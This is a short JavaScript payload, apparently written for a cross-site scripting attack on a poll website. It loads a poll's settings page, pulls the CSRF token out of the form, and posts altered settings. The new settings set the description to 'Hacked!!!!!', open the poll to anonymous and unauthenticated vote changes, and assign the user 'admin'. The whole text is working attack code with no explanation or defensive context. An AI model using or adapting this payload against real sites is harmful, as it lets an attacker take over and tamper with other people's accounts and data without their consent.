fetch('/poll/6FT35RsxDq/settings/').then((response) => response.text()).then(text => {
    console.log(text);
    let parser = new DOMParser();
    let doc = parser.parseFromString(text, 'text/html');
    let csrftoken = doc.forms[1].elements[0].value;
    console.log(csrftoken);

    fetch('/poll/6FT35RsxDq/settings/', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: 'csrfmiddlewaretoken=' + csrftoken + '&title=Orgaplan+SS2020&due_date=&show_results=complete&timezone_name=Europe%2FBerlin&description=Hacked%21%21%21%21%21&Save=Save+changes&allow_comments=on&anonymous_allowed=on&public_listening=on&allow_unauthenticated_vote_changes=on&show_invitations=on&change_vote_after_event=on&sorting=2&user=admin&group='
    })
});